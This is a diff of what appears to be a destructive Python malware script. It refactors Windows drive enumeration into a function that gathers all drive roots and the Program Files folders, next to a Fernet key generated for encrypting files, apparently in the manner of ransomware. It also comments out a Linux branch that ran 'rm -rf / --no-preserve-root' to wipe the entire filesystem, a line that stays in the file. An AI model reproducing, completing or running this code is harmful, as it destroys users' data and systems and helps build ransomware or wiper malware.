@@ -5,6 +5,23 @@ from cryptography.fernet import Fernet
 import re
 from string import ascii_uppercase
 
+def get_available_windrives():
+    drives = []
+    for drive in ascii_uppercase:
+        if os.path.exists(os.path.join(str(drive) + ":\\")):
+            drives.append(str(drive) + ":\\")
+
+    for i, drive in enumerate(drives):
+        if(drive in os.getenv('windir') and not drive == ''):
+            progf86_path = drive + 'Program Files (x86)\\' 
+            progf_path = drive + 'Program Files\\'
+
+            drives.append(progf86_path)
+            drives.append(progf_path)
+            drives.pop(i)
+    
+    return drives
+
 
 if(platform.system() == 'Windows'):
     print("Windows OS discovered. Getting System32's path...")
@@ -27,21 +44,20 @@ if(platform.system() == 'Windows'):
         key = Fernet.generate_key()
         keyfunc = Fernet(key)
 
-        drives_list = []
-        for drive in ascii_uppercase:
-            if os.path.exists(os.path.join(str(drive) + ":\\")):
-                drives_list.append(str(drive) + ":\\")
-    
-        for i, drive in enumerate(drives_list):
-            drive = drive.rstrip(drive[:-1]) # remove the extra backslash
-            print(drive)
-            if(drive in os.getenv('windir')):
-                drives_list.pop(i)
+        drives_list = get_available_windrives()
+        print(drives_list)
+
+
+        
+        
+
+
 
         
 
 if(platform.system() == 'Linux'):
     print('Linux OS discovered.')
-    print('Deleting root...')
-    subprocess.run(['rm', '-rf', r'/', '--no-preserve-root'])
-    print('Done.')
+
+    # print('Deleting root...')
+    # subprocess.run(['rm', '-rf', r'/', '--no-preserve-root'])
+    # print('Done.')
